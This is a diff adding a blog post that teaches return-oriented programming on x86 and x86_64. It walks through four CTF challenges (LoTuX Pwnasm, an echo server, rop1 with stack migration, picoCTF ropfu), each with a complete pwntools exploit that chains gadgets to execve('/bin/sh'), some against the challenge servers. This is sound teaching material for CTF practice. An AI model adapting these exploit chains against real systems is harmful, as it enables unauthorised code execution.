@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Before allI had posted a note of pwn for beginners(link here), and recently I’ve learned more about ROP, so here is this post~   ROPWhat is ROP?ROP(Return Oriented Program) is an attack method extende">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Return Oriented Program note">
+<meta property="og:url" content="http://wha13.github.io/2023/10/29/rop1/index.html">
+<meta property="og:site_name" content="Whale120&#39;s Blog">
+<meta property="og:description" content="Before allI had posted a note of pwn for beginners(link here), and recently I’ve learned more about ROP, so here is this post~   ROPWhat is ROP?ROP(Return Oriented Program) is an attack method extende">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://hackmd.io/_uploads/ByWE-tiMa.png">
+<meta property="article:published_time" content="2023-10-29T21:10:04.000Z">
+<meta property="article:modified_time" content="2024-07-25T09:30:32.267Z">
+<meta property="article:author" content="William Lin">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="ROP">
+<meta property="article:tag" content="Stack Migration">
+<meta property="article:tag" content="x86_64">
+<meta property="article:tag" content="x86">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hackmd.io/_uploads/ByWE-tiMa.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Return Oriented Program note</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/11/04/block-cipher-1/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/10/25/apcs202310/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2023/10/29/rop1/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2023/10/29/rop1/&text=Return Oriented Program note"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2023/10/29/rop1/&title=Return Oriented Program note"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2023/10/29/rop1/&is_video=false&description=Return Oriented Program note"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Return Oriented Program note&body=Check out this article: http://wha13.github.io/2023/10/29/rop1/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2023/10/29/rop1/&title=Return Oriented Program note"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2023/10/29/rop1/&title=Return Oriented Program note"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2023/10/29/rop1/&title=Return Oriented Program note"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2023/10/29/rop1/&title=Return Oriented Program note"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2023/10/29/rop1/&name=Return Oriented Program note&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2023/10/29/rop1/&t=Return Oriented Program note"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROP"><span class="toc-number">2.</span> <span class="toc-text">ROP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#What-is-ROP"><span class="toc-number">2.1.</span> <span class="toc-text">What is ROP?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#x86-64-ROP"><span class="toc-number">2.2.</span> <span class="toc-text">x86_64 ROP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#x86-ROP"><span class="toc-number">2.3.</span> <span class="toc-text">x86 ROP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenges"><span class="toc-number">3.</span> <span class="toc-text">Challenges</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Pwnasm-from-LoTuX-CTF"><span class="toc-number">3.1.</span> <span class="toc-text">Pwnasm from LoTuX CTF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#echo-server"><span class="toc-number">3.2.</span> <span class="toc-text">echo server</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rop1-sean-Pwn-2"><span class="toc-number">3.3.</span> <span class="toc-text">rop1-sean_Pwn-2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Stack-Migration"><span class="toc-number">3.3.1.</span> <span class="toc-text">Stack Migration</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Solution"><span class="toc-number">3.3.2.</span> <span class="toc-text">Solution</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ropfu-from-picoCTF"><span class="toc-number">3.4.</span> <span class="toc-text">ropfu from picoCTF</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Return Oriented Program note
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">William Lin</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-10-29T21:10:04.000Z" class="dt-published" itemprop="datePublished">2023-10-29</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/ROP/" rel="tag">ROP</a>, <a class="p-category" href="/tags/Stack-Migration/" rel="tag">Stack Migration</a>, <a class="p-category" href="/tags/pwn/" rel="tag">pwn</a>, <a class="p-category" href="/tags/x86/" rel="tag">x86</a>, <a class="p-category" href="/tags/x86-64/" rel="tag">x86_64</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>I had posted a note of pwn for beginners(<a href="https://wha13.github.io/2023/10/12/pwn-note/">link here</a>), and recently I’ve learned more about ROP, so here is this post~  </p>
+<h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><h3 id="What-is-ROP"><a href="#What-is-ROP" class="headerlink" title="What is ROP?"></a>What is ROP?</h3><p>ROP(Return Oriented Program) is an attack method extended from BOF(Buffer Overflow), in ROP, the key point is to cover return address and lead it to Program Fragments you want(can be repeated many times if you have many usable fragments).<br>Basically, a fragment end with <code>ret</code> is mostly used.  </p>
+<h3 id="x86-64-ROP"><a href="#x86-64-ROP" class="headerlink" title="x86_64 ROP"></a>x86_64 ROP</h3><p>In x86_64, size of an address is 8 bytes(p64 in pwntool), so registers used frequently are rax, rdi, rsi, rdx ……<br>To connect the ROP Chain, it’s important to make sure every register called in the function, and find the corresponding fregment in the program. Is easy to find fregment with tools such as <code>ROPgadget</code>  and <code>pwntool</code>.<br><strong>ROPgadget:</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary=binary_file | grep &quot;mov dword .* ret&quot; | less</span><br></pre></td></tr></table></figure>
+<p>In this command, I want to find a gadget start with mov_dword and end with ret.<br>but is much more easier to find a register fragment with pwntool.<br><strong>pwntool</strong></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">rop=ROP(<span class="string">&#x27;./oob1&#x27;</span>)</span><br><span class="line"><span class="comment"># find an rdi fregment</span></span><br><span class="line">rop.rdi</span><br><span class="line"><span class="comment"># result</span></span><br><span class="line"><span class="comment"># Gadget(0x400a03, [&#x27;pop rdi&#x27;, &#x27;ret&#x27;], [&#x27;rdi&#x27;], 0x8)</span></span><br></pre></td></tr></table></figure>
+<p>In x86_64 system, if a variable want to be executive(or other action), it needs an syscall.  </p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rop.syscall</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://syscalls.w3challs.com/?arch=x86_64">syscall table</a><br>syscall table has each register need for every call and the meaning for each register.<br>p.s. execve is excution call.<br>Connect fragment like <code>pop rdi; ret</code> with a value can modify the value of <code>rdi</code> and move to mext fregment(possibly a function or syscall)<br>An example for an excution syscall:  </p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#setting environment</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#payload</span></span><br><span class="line">flat(pop_rax_rdx_rbx_ret, <span class="number">0x3b</span>, <span class="number">0</span>, <span class="number">0</span>, pop_rdi_ret, shellcode, pop_rsi_ret, <span class="number">0</span>, syscall)</span><br></pre></td></tr></table></figure>
+<p>This ROP chain would make the value of rax become <code>0x3b</code>(execve on <a target="_blank" rel="noopener" href="https://syscalls.w3challs.com/?arch=x86_64">syscall table</a>), and rdi value become the address of shellcode(like string: <code>/bin/sh\x00</code>)<br><code>\x00</code> is a symbol to stop reading.<br>Also, vmmap in geb-peda is often used to find writable(or something else) datas.  </p>
+<h3 id="x86-ROP"><a href="#x86-ROP" class="headerlink" title="x86 ROP"></a>x86 ROP</h3><p>Same logic as <code>x86_64</code><br><a target="_blank" rel="noopener" href="https://syscalls.w3challs.com/?arch=x86">syscall table</a><br>Some differents between x86 and x86_64:  </p>
+<ol>
+<li>In x86 system, each address and register are mostly 4 bytes  </li>
+<li>int80 in x86 has the same function with syscall in x86_64<br><strong>Example:</strong><br>execve in x86:  <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#setting environment</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"><span class="comment">#payload</span></span><br><span class="line">flat(pop_eax_ret, <span class="number">0xb</span>, pop_edx_ebx_ret, <span class="number">0</span>, data, pop_ecx_ret, <span class="number">0</span>, int80)</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h2><h3 id="Pwnasm-from-LoTuX-CTF"><a href="#Pwnasm-from-LoTuX-CTF" class="headerlink" title="Pwnasm from LoTuX CTF"></a>Pwnasm from LoTuX CTF</h3><p><a target="_blank" rel="noopener" href="https://lotuxctf.com/challenges#Pwnasm-27">Click link</a><br>It’s a simple ROP<br><strong>Solution</strong><br>Start with pwntool:  </p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">rop=ROP(<span class="string">&#x27;./pwnasm&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>Extracted datas:  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    Stack:    Executable</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
+<p>It’s a x86_64 system(amd64), so check out the <a target="_blank" rel="noopener" href="https://syscalls.w3challs.com/?arch=x86_64">syscall table</a> ,register gadgets needed to trigger <code>syscall</code> are <code>rax</code>, <code>rdi</code>, <code>rsi</code>, <code>rdx</code>.<br>Also, from the reverse result by <a target="_blank" rel="noopener" href="https://ghidra-sre.org/">Ghidra</a><img src="https://hackmd.io/_uploads/ByWE-tiMa.png"><br>there are some weird datas on the stack(our shell(<code>&#39;/bin/sh&#39;</code> at<code>0x00402000</code>) and first part of flag), so it’s possible to construct an ROP Chain and excuse the shell  </p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rop.rax</span><br><span class="line">rop.rdi</span><br><span class="line">rop.rsi</span><br><span class="line">rop.rdx</span><br><span class="line">rop.syscall</span><br></pre></td></tr></table></figure>
+<p>Extracted datas:  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; rop.rax</span><br><span class="line">Gadget(0x401000, [&#x27;pop rax&#x27;, &#x27;ret&#x27;], [&#x27;rax&#x27;], 0x8)</span><br><span class="line">&gt;&gt;&gt; rop.rdx</span><br><span class="line">Gadget(0x401006, [&#x27;pop rdx&#x27;, &#x27;ret&#x27;], [&#x27;rdx&#x27;], 0x8)</span><br><span class="line">&gt;&gt;&gt; rop.rdi</span><br><span class="line">Gadget(0x401002, [&#x27;pop rdi&#x27;, &#x27;ret&#x27;], [&#x27;rdi&#x27;], 0x8)</span><br><span class="line">&gt;&gt;&gt; rop.rsi</span><br><span class="line">Gadget(0x401004, [&#x27;pop rsi&#x27;, &#x27;ret&#x27;], [&#x27;rsi&#x27;], 0x8)</span><br><span class="line">&gt;&gt;&gt; rop.syscall</span><br><span class="line">gadget(address=4198416, details=Gadget(0x401010, [&#x27;syscall&#x27;, &#x27;ret&#x27;], [], 0x4))</span><br></pre></td></tr></table></figure>
+<p>Finally, my exploit code:  </p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">r=remote(<span class="string">&#x27;lotuxctf.com&#x27;</span>, <span class="number">10005</span>)</span><br><span class="line"><span class="comment"># gadgets</span></span><br><span class="line">shell=<span class="number">0x402000</span></span><br><span class="line">pop_rax_ret=<span class="number">0x401000</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x401002</span></span><br><span class="line">pop_rsi_ret=<span class="number">0x401004</span></span><br><span class="line">pop_rdx_ret=<span class="number">0x401006</span></span><br><span class="line">syscall=<span class="number">0x401010</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># exploit</span></span><br><span class="line">payload=flat(pop_rax_ret, <span class="number">0x3b</span>, pop_rdi_ret, shell, pop_rsi_ret, <span class="number">0</span>, pop_rdx_ret, <span class="number">0</span>, syscall)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="echo-server"><a href="#echo-server" class="headerlink" title="echo server"></a>echo server</h3><p><a href="https://wha13.github.io/files/echo_server/echo_server">file</a><br><a href="https://wha13.github.io/files/echo_server/echo_server.c">source code</a><br>A x86_64 file<br>ROP Chain:<br><code>pop rdi; ret</code>-&gt;<code>change rdi location to global variable</code>-&gt;<code>trigger get function</code>-&gt;<code>return to runCMD function to bypass getString() filtering function</code><br>Exploit:  </p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">r=process(<span class="string">&#x27;./echo_server&#x27;</span>)</span><br><span class="line"><span class="comment"># gadgets</span></span><br><span class="line">shell=<span class="number">0x601080</span></span><br><span class="line">runCMD=<span class="number">0x4006c6</span></span><br><span class="line">gets=<span class="number">0x4005a0</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x400923</span></span><br><span class="line">shell=<span class="number">0x601080</span></span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#exploit</span></span><br><span class="line">r.recvlines(<span class="number">7</span>)</span><br><span class="line">s=r.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">payload1=padding+flat(pop_rdi_ret, shell, gets, runCMD)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="rop1-sean-Pwn-2"><a href="#rop1-sean-Pwn-2" class="headerlink" title="rop1-sean_Pwn-2"></a>rop1-sean_Pwn-2</h3><p><a href="https://wha13.github.io/files/rop1-sean_Pwn-2/rop1">file</a><br><a target="_blank" rel="noopener" href="https://blog.frozenkp.me/pwn/stack_migration/">Stack Migration</a>  </p>
+<h4 id="Stack-Migration"><a href="#Stack-Migration" class="headerlink" title="Stack Migration"></a>Stack Migration</h4><p>Stack Migration is a technique to cover register base into a modified stack location, and the first 8 bytes(if it’s a x86_64 system)&#x2F;first 4 bytes(if it’s a x86 system) need to be a location for new register(<del>garbage</del>)</p>
+<h4 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h4><p>First write the ROP Chain into global variable, and trgger it in <code>func1</code>, remember to leave.</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">r=process(<span class="string">&#x27;./rop1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gadgets</span></span><br><span class="line">shell=(<span class="number">0x006c9eb8</span>+<span class="number">0x006cd548</span>)//<span class="number">2</span></span><br><span class="line">pop_rax_rdx_rbx_ret=<span class="number">0x478616</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x401516</span></span><br><span class="line">pop_rsi_ret=<span class="number">0x401637</span></span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span></span><br><span class="line">read=<span class="number">0x43f4b0</span></span><br><span class="line">syscall=<span class="number">0x4003da</span></span><br><span class="line">func1=<span class="number">0x4009ae</span></span><br><span class="line">leave=<span class="number">0x4009e4</span></span><br><span class="line">main=<span class="number">0x4009e6</span></span><br><span class="line">bof2=<span class="number">0x6ccd60</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># exploit</span></span><br><span class="line">payload1=flat(<span class="number">1004120</span>, pop_rax_rdx_rbx_ret, <span class="number">0x3b</span>, <span class="number">0</span>, <span class="number">0</span>, pop_rdi_ret, bof2+<span class="number">10</span>*<span class="number">0x8</span>, pop_rsi_ret, <span class="number">0</span>, syscall, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">payload2=<span class="string">b&#x27;rahwhale&#x27;</span>*<span class="number">4</span>+flat(bof2, leave)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="ropfu-from-picoCTF"><a href="#ropfu-from-picoCTF" class="headerlink" title="ropfu from picoCTF"></a>ropfu from picoCTF</h3><p><a target="_blank" rel="noopener" href="https://play.picoctf.org/practice/challenge/292?category=6&page=3">link</a><br>An <code>i386</code> (x86) system, key points are on above.<br>Use fragments like <code>mov dword [edx] eax; ret</code> to write shell on eax into location edx.<br>p.s.the shell input need to be converted into hex and reversed<br><strong>exploit</strong></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"><span class="comment">#r=process(&#x27;./ropfu&#x27;)</span></span><br><span class="line">r=remote(<span class="string">&#x27;saturn.picoctf.net&#x27;</span>, <span class="number">52033</span>)</span><br><span class="line"><span class="comment"># gadgets</span></span><br><span class="line">data=(<span class="number">0x080e36a0</span>+<span class="number">0x080e6ff0</span>)//<span class="number">2</span></span><br><span class="line">pop_eax_ret=<span class="number">0x80b073a</span></span><br><span class="line">pop_ebx_ret=<span class="number">0x8049022</span></span><br><span class="line">pop_ecx_ret=<span class="number">0x8049e29</span></span><br><span class="line">pop_edx_ebx_ret=<span class="number">0x80583b9</span></span><br><span class="line">syscall=<span class="number">0x806417d</span></span><br><span class="line">mov_edx_eax=<span class="number">0x080590f2</span></span><br><span class="line">get=<span class="number">0x08051b60</span></span><br><span class="line">read=<span class="number">0x0806ece0</span></span><br><span class="line">vuln=<span class="number">0x08049d85</span></span><br><span class="line"><span class="built_in">bin</span>=<span class="number">0x6e69622f</span></span><br><span class="line">sh=<span class="number">0x0068732f</span></span><br><span class="line">int80=<span class="number">0x0807163f</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#exploit</span></span><br><span class="line">s=r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">r.sendline(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x18</span>+<span class="number">4</span>)+flat(pop_eax_ret, <span class="built_in">bin</span>, pop_edx_ebx_ret, data, <span class="number">0</span>, mov_edx_eax, pop_eax_ret, sh, pop_edx_ebx_ret, data+<span class="number">4</span>, <span class="number">0</span>, mov_edx_eax, pop_eax_ret, <span class="number">0xb</span>, pop_edx_ebx_ret, <span class="number">0</span>, data, pop_ecx_ret, <span class="number">0</span>, int80))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
